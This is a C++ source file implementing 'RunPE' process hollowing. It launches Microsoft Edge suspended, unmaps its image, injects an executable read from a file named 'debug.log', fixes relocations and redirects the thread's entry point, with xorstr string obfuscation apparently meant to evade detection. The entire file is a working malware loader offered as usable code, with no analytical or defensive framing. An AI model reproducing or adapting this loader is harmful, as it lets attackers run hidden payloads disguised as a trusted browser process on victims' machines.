
#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
// Windows Header Files
#include <windows.h>
#include <process.h>
// C RunTime Header Files
#include <stdlib.h>
#include <stdio.h>
#include <malloc.h>
#include <memory.h>
#include <tchar.h>
#include <iostream>
#include <fstream>

//
// Include NTDLL-related headers.
//
#define NTDLL_NO_INLINE_INIT_STRING
#pragma warning( push )  
#pragma warning( disable : 4005 )  
#include <ntdll.h>
#pragma warning( pop ) 
#pragma comment(lib,"ntdll.lib")

#define JM_XORSTR_DISABLE_AVX_INTRINSICS
#include <xorstr.hpp>

BOOL RunPe(LPCSTR szHostExe, LPCSTR szInjectedFile)
{

	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	// Create a Process with SUSPEND
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOWNORMAL;

	if (!CreateProcessA(
		szHostExe,
		NULL,
		0,
		0,
		FALSE,
		CREATE_SUSPENDED,
		0,
		0,
		&si,
		&pi
	))
	{
		printf("Error at CreateProcessA, code = %d\n", GetLastError());
		return FALSE;
	};

	HANDLE hFile;
	if (!(hFile = CreateFileA(
		szInjectedFile,
		GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	)) || INVALID_HANDLE_VALUE == hFile)
	{
		printf("Error at CreateFileA, code = %d\n", GetLastError());
		return FALSE;
	};

	LARGE_INTEGER u32FileSize;
	if (!GetFileSizeEx(
		hFile,
		&u32FileSize
	))
	{
		printf("Error at GetFileSizeEx, code = %d\n", GetLastError());
		return FALSE;
	};

	LPVOID lpPeContent;
	if (!(lpPeContent = VirtualAlloc(
		NULL,
		u32FileSize.QuadPart,
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_READWRITE
	)))
	{
		printf("Error at VirtualAlloc, code = %d\n", GetLastError());
		return FALSE;
	};

	DWORD dwReadBytes;
	if (!ReadFile(
		hFile,
		lpPeContent,
		u32FileSize.QuadPart,
		&dwReadBytes,
		NULL
	))
	{
		printf("Error at ReadFile, code = %d\n", GetLastError());
		return FALSE;
	};

	CloseHandle(hFile);

	PIMAGE_DOS_HEADER lpDosHeader = (PIMAGE_DOS_HEADER)lpPeContent;
	PIMAGE_NT_HEADERS lpNtHeader = (PIMAGE_NT_HEADERS)((LONG_PTR)lpPeContent + lpDosHeader->e_lfanew);

	DWORD_PTR lpPreferableBase = (DWORD_PTR)lpNtHeader->OptionalHeader.ImageBase;
	CONTEXT ThreadContext = {0};

	ThreadContext.ContextFlags = CONTEXT_INTEGER;

	if (!GetThreadContext(
		pi.hThread,
		&ThreadContext
	))
	{
		printf("Error at GetThreadContext, code = %d\n", GetLastError());
		return FALSE;
	};

#if defined(_M_X64) || defined(__amd64__)
	LPVOID lpPebImageBase = (LPVOID)(ThreadContext.Rdx + 2 * sizeof(ULONGLONG));
#else
	LPVOID lpPebImageBase = (LPVOID)(ThreadContext.Ebx + 2 * sizeof(ULONG));
#endif

	SIZE_T stReadBytes;
	PVOID lpOriginalImageBase;

	DWORD_PTR dwOriginalImageBase = 0;
	if (!ReadProcessMemory(
		pi.hProcess,
		lpPebImageBase,
		&dwOriginalImageBase,
		sizeof(dwOriginalImageBase),
		&stReadBytes
	))
	{
		printf("Error at ReadProcessMemory, 0x%p, code = %d\n", lpPebImageBase, GetLastError());
		return FALSE;
	};
	lpOriginalImageBase = (PVOID)dwOriginalImageBase;


	if (lpOriginalImageBase == (LPVOID)lpPreferableBase)
	{
		HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
		FARPROC NtUnmapViewOfSection = GetProcAddress(hNtdll, "NtUnmapViewOfSection");

		if ((*(NTSTATUS(*)(HANDLE, PVOID)) NtUnmapViewOfSection)(
			pi.hProcess,
			lpOriginalImageBase
			))
		{
			printf("Error at NtUnmapViewOfSection, code = %d\n", GetLastError());
			return FALSE;
		};
	};

	LPVOID lpAllocatedBase;
	if (!(lpAllocatedBase = VirtualAllocEx(
		pi.hProcess,
		(LPVOID)lpPreferableBase,
		lpNtHeader->OptionalHeader.SizeOfImage,
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE
	)))
	{
		if (GetLastError() == ERROR_INVALID_ADDRESS)
		{
			if (!(lpAllocatedBase = VirtualAllocEx(
				pi.hProcess,
				NULL,
				lpNtHeader->OptionalHeader.SizeOfImage,
				(MEM_COMMIT | MEM_RESERVE),
				PAGE_EXECUTE_READWRITE
			)))
			{
				printf("Error at VirtualAllocEx, code = %d\n", GetLastError());
				return FALSE;
			};
		}
		else
		{
			printf("Error at VirtualAllocEx, code = %d\n", GetLastError());
			return FALSE;
		}
	};

	if (lpOriginalImageBase != lpAllocatedBase)
	{
		SIZE_T stWrittenBytes;
		if (!WriteProcessMemory(
			pi.hProcess,
			lpPebImageBase,
			&lpAllocatedBase,
			sizeof(lpAllocatedBase),
			&stWrittenBytes
		))
		{
			printf("Error at WriteProcessMemory, code = %d\n", GetLastError());
			return FALSE;
		};
	}

	lpNtHeader->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;

	if (lpAllocatedBase != (LPVOID)lpPreferableBase)
	{
		if (lpNtHeader->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED)
		{
			printf("Cannot relocate the PE because the relocation table is stripped\n");
			return FALSE;
		}
		else
		{

#if defined(_M_X64) || defined(__amd64__)
			lpNtHeader->OptionalHeader.ImageBase = (ULONGLONG)lpAllocatedBase;
#else
			lpNtHeader->OptionalHeader.ImageBase = (ULONG)lpAllocatedBase;
#endif

			DWORD lpRelocationTableBaseRva = lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

			PIMAGE_SECTION_HEADER lpHeaderSection = IMAGE_FIRST_SECTION(lpNtHeader);
			DWORD dwRelocationTableBaseOffset = 0;
			for (DWORD dwSecIndex = 0; dwSecIndex < lpNtHeader->FileHeader.NumberOfSections; dwSecIndex++) {
				if (lpRelocationTableBaseRva >= lpHeaderSection[dwSecIndex].VirtualAddress &&
					lpRelocationTableBaseRva < lpHeaderSection[dwSecIndex].VirtualAddress + lpHeaderSection[dwSecIndex].Misc.VirtualSize) {
					dwRelocationTableBaseOffset = lpHeaderSection[dwSecIndex].PointerToRawData + lpRelocationTableBaseRva - lpHeaderSection[dwSecIndex].VirtualAddress;
					break;
				}
			};

			LPVOID lpRelocationTableBase = (LPVOID)((DWORD_PTR)lpPeContent + dwRelocationTableBaseOffset);
			DWORD dwRelocationTableSize = lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

			for (DWORD dwMemIndex = 0; dwMemIndex < dwRelocationTableSize;)
			{
				IMAGE_BASE_RELOCATION* lpBaseRelocBlock = (IMAGE_BASE_RELOCATION*)((DWORD_PTR)lpRelocationTableBase + dwMemIndex);
				LPVOID lpBlocksEntery = (LPVOID)((DWORD_PTR)lpBaseRelocBlock + sizeof(lpBaseRelocBlock->SizeOfBlock) + sizeof(lpBaseRelocBlock->VirtualAddress));

				DWORD dwNumberOfBlocks = (lpBaseRelocBlock->SizeOfBlock - sizeof(lpBaseRelocBlock->SizeOfBlock) - sizeof(lpBaseRelocBlock->VirtualAddress)) / sizeof(WORD);
				WORD* lpBlocks = (WORD*)lpBlocksEntery;

				for (DWORD dwBlockIndex = 0; dwBlockIndex < dwNumberOfBlocks; dwBlockIndex++)
				{
					WORD wBlockType = (lpBlocks[dwBlockIndex] & 0xf000) >> 0xC;
					WORD wBlockOffset = lpBlocks[dwBlockIndex] & 0x0fff;

					if ((wBlockType == IMAGE_REL_BASED_HIGHLOW) || (wBlockType == IMAGE_REL_BASED_DIR64))
					{
						DWORD dwAdrressToFixRva = lpBaseRelocBlock->VirtualAddress + (DWORD)wBlockOffset;

						lpHeaderSection = IMAGE_FIRST_SECTION(lpNtHeader);
						DWORD dwAdrressToFixOffset = 0;
						for (DWORD dwSecIndex = 0; dwSecIndex < lpNtHeader->FileHeader.NumberOfSections; dwSecIndex++) {
							if (dwAdrressToFixRva >= lpHeaderSection[dwSecIndex].VirtualAddress &&
								dwAdrressToFixRva < lpHeaderSection[dwSecIndex].VirtualAddress + lpHeaderSection[dwSecIndex].Misc.VirtualSize) {
								dwAdrressToFixOffset = lpHeaderSection[dwSecIndex].PointerToRawData + dwAdrressToFixRva - lpHeaderSection[dwSecIndex].VirtualAddress;
								break;
							};
						};

#if defined(_M_X64) || defined(__amd64__)
						ULONGLONG* lpAddressToFix = (ULONGLONG*)((DWORD_PTR)lpPeContent + dwAdrressToFixOffset);
						*lpAddressToFix -= lpPreferableBase;
						*lpAddressToFix += (ULONGLONG)lpAllocatedBase;
#else
						ULONG* lpAddressToFix = (ULONG*)((DWORD_PTR)lpPeContent + dwAdrressToFixOffset);
						*lpAddressToFix -= lpPreferableBase;
						*lpAddressToFix += (ULONG)lpAllocatedBase;
#endif

					};
				};
				dwMemIndex += lpBaseRelocBlock->SizeOfBlock;
			};
		};
	};

#if defined(_M_X64) || defined(__amd64__)
	ThreadContext.Rcx = (ULONGLONG)lpAllocatedBase + lpNtHeader->OptionalHeader.AddressOfEntryPoint;
#else
	ThreadContext.Eax = (ULONG)lpAllocatedBase + lpNtHeader->OptionalHeader.AddressOfEntryPoint;
#endif

	if (!SetThreadContext(
		pi.hThread,
		&ThreadContext
	))
	{
		printf("Error at SetThreadContext, code = %d\n", GetLastError());
		return FALSE;
	};

	SIZE_T stWrittenBytes;
	if (!WriteProcessMemory(
		pi.hProcess,
		lpAllocatedBase,
		lpPeContent,
		lpNtHeader->OptionalHeader.SizeOfHeaders,
		&stWrittenBytes
	))
	{
		printf("Error at WriteProcessMemory, code = %d\n", GetLastError());
		return FALSE;
	};

	DWORD dwOldProtect;
	if (!VirtualProtectEx(
		pi.hProcess,
		lpAllocatedBase,
		lpNtHeader->OptionalHeader.SizeOfHeaders,
		PAGE_READONLY,
		&dwOldProtect
	))
	{
		printf("Error at VirtualProtectEx, code = %d\n", GetLastError());
		return FALSE;
	};

	IMAGE_SECTION_HEADER* lpSectionHeaderArray = (IMAGE_SECTION_HEADER*)((ULONG_PTR)lpPeContent + lpDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));

	for (int i = 0; i < lpNtHeader->FileHeader.NumberOfSections; i++)
	{
		if (!WriteProcessMemory(
			pi.hProcess,
#if defined(_M_X64) || defined(__amd64__)
			(LPVOID)((ULONGLONG)lpAllocatedBase + lpSectionHeaderArray[i].VirtualAddress),
#else
			(LPVOID)((ULONG)lpAllocatedBase + lpSectionHeaderArray[i].VirtualAddress),
#endif
			(LPCVOID)((DWORD_PTR)lpPeContent + lpSectionHeaderArray[i].PointerToRawData),
			lpSectionHeaderArray[i].SizeOfRawData,
			&stWrittenBytes
		))
		{
			printf("Error at WriteProcessMemory, code = %d\n", GetLastError());
			return FALSE;
		};

		DWORD dwSectionMappedSize = 0;
		if (i == lpNtHeader->FileHeader.NumberOfSections - 1) {
			dwSectionMappedSize = lpNtHeader->OptionalHeader.SizeOfImage - lpSectionHeaderArray[i].VirtualAddress;
		}
		else {
			dwSectionMappedSize = lpSectionHeaderArray[i + 1].VirtualAddress - lpSectionHeaderArray[i].VirtualAddress;
		}

		DWORD dwSectionProtection = 0;
		if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
			(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) &&
			(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
			dwSectionProtection = PAGE_EXECUTE_READWRITE;
		}
		else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
			(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ)) {
			dwSectionProtection = PAGE_EXECUTE_READ;
		}
		else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
			(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
			dwSectionProtection = PAGE_EXECUTE_WRITECOPY;
		}
		else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) &&
			(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
			dwSectionProtection = PAGE_READWRITE;
		}
		else if (lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
			dwSectionProtection = PAGE_EXECUTE;
		}
		else if (lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) {
			dwSectionProtection = PAGE_READONLY;
		}
		else if (lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
			dwSectionProtection = PAGE_WRITECOPY;
		}
		else {
			dwSectionProtection = PAGE_NOACCESS;
		}

		if (!VirtualProtectEx(
			pi.hProcess,
#if defined(_M_X64) || defined(__amd64__)
			(LPVOID)((ULONGLONG)lpAllocatedBase + lpSectionHeaderArray[i].VirtualAddress),
#else
			(LPVOID)((ULONG)lpAllocatedBase + lpSectionHeaderArray[i].VirtualAddress),
#endif
			dwSectionMappedSize,
			dwSectionProtection,
			&dwOldProtect
		))
		{
			printf("Error at VirtualProtectEx, code = %d\n", GetLastError());
			return FALSE;
		};
	};

	if (ResumeThread(
		pi.hThread
	) == -1)
	{
		printf("Error at ResumeThread, code = %d\n", GetLastError());
		return FALSE;
	};

	return TRUE;
}


int main()
{

	auto ret = RunPe(
		xorstr_("msedge.exe"),  // Õ‚ø« "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
		xorstr_("debug.log")    // exe file
	);

	printf_s("RunPE ret: %d \r\n", ret);

	system("pause");
}
